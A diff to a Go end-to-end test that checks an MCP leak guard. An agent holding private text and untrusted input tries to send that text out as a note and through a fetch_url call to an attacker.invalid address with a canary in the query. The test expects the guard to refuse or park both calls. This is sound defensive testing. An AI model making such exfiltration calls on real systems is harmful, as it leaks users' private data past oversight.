@@ -147,15 +147,16 @@ func receiverCalls(ctx SpecContext, base string) []exfilRecord {
 // The exfiltration case of the MCP leak guard (ADR 0084, ADR 0091; #293) from inside a real
 // sandbox: an agent that has read private text and taken untrusted input (both legs, which the
 // fixture's read_item sets) tries to send that text out through an MCP tool on the gateway path,
-// once as a note body and once as a second write whose title is an attacker URL (koinon-fakemcp has no
-// fetch-style tool or address argument; #348 adds a real one with the CI wiring). The guard refuses the call or parks
-// it for an approval, and nothing reaches the fake receiver.
+// once as a note body to write_item and once through fetch_url, koinon-fakemcp's fetch-style tool, whose url
+// argument names an attacker destination. The guard refuses the call or parks it for an approval, and nothing
+// reaches the fake receiver.
 //
 // It needs a guarded gateway (agentgateway with the real leak guard in front of koinon-fakemcp),
-// which this suite does not start: the e2e install (test/e2e) or the lab provides it, and the
-// KOINON_ESCAPE_MCP_* variables name it. Without them the case skips. The fixture's tools are the
-// ones of koinon-fakemcp, set up as the kind e2e sets them up (test/e2e/mcp_test.go): read_item is
-// auto with sink class none, write_item is auto and undeclared (external-high). The case fails when
+// which this suite does not start: the kind e2e install (test/e2e, step 6b, through test/e2e/escape-mcp.sh
+// and test/escape/kind.sh; #348) or the lab provides it, and the KOINON_ESCAPE_MCP_* variables name it.
+// Without them the case skips. The fixture's tools are the ones of koinon-fakemcp, set up as the kind e2e
+// sets them up (test/e2e/mcp_test.go): read_item is auto with sink class none, write_item and fetch_url
+// are auto and undeclared (external-high). The case fails when
 // the guard is bypassed: a write_item that gets through reaches the receiver.
 var _ = Describe("Leak guard exfiltration", Label("escape", "openshell", "leakguard"), Ordered, func() {
 	var (
@@ -206,7 +207,7 @@ var _ = Describe("Leak guard exfiltration", Label("escape", "openshell", "leakgu
 		listed := g.mcpSession(ctx, sandbox, url, initialize, rpc(2, "tools/list", map[string]any{}))
 		Expect(listed).To(HaveLen(2))
 		Expect(listed[1].Failed).To(BeFalse(), listed[1].Text)
-		var read, write string
+		var read, write, fetch string
 		for _, name := range strings.Fields(listed[1].Text) {
 			switch {
 			case strings.HasSuffix(name, "_read_item"):
@@ -217,6 +218,7 @@ var _ = Describe("Leak guard exfiltration", Label("escape", "openshell", "leakgu
 		}
 		Expect(read).NotTo(BeEmpty(), "the fixture serves read_item to the agent: "+listed[1].Text)
 		Expect(write).NotTo(BeEmpty(), "the fixture serves write_item on the server's own target (auto tier): "+listed[1].Text)
+		Expect(fetch).NotTo(BeEmpty(), "the fixture serves fetch_url on the server's own target (auto tier): "+listed[1].Text)
 
 		By("it reads private text through an allowed tool, which sets both legs")
 		call := func(id int, tool string, args map[string]any) map[string]any {
@@ -228,13 +230,14 @@ var _ = Describe("Leak guard exfiltration", Label("escape", "openshell", "leakgu
 			// title is the one argument koinon-fakemcp's write_item accepts (its schema forbids others), so a
 			// bypassed call is validated, handled and recorded, and the receiver check below goes red.
 			call(3, write, map[string]any{"title": "fyi: " + canary}),
-			call(4, write, map[string]any{"title": attacker}),
+			// fetch_url names its destination in url: the attacker's address, with the canary in the query.
+			call(4, fetch, map[string]any{"url": attacker}),
 		)
 		Expect(answers).To(HaveLen(3))
 		Expect(answers[0].Failed).To(BeFalse(), "the read is allowed: "+answers[0].Text)
 		Expect(answers[0].Text).To(ContainSubstring(canary))
 
-		By("sending it out, as a note and as a second write carrying an attacker URL, is refused or parked for an approval")
+		By("sending it out, as a note and as a fetch of an attacker URL, is refused or parked for an approval")
 		for i, a := range answers[1:] {
 			Expect(a.Failed).To(BeTrue(), fmt.Sprintf("call %d must not succeed: %s", i, a.Text))
 			Expect(a.Text).To(Or(
@@ -248,7 +251,7 @@ var _ = Describe("Leak guard exfiltration", Label("escape", "openshell", "leakgu
 		By("nothing the guard stopped reached the receiver")
 		calls := receiverCalls(ctx, receiver)
 		Expect(calls[before:]).To(HaveEach(HaveField("Tool", "read_item")),
-			"only the allowed read reached the server; a write_item here means the guard was bypassed")
+			"only the allowed read reached the server; a write_item or fetch_url here means the guard was bypassed")
 		for _, c := range calls[before:] {
 			Expect(c.Args).NotTo(ContainSubstring("attacker.invalid"))
 		}
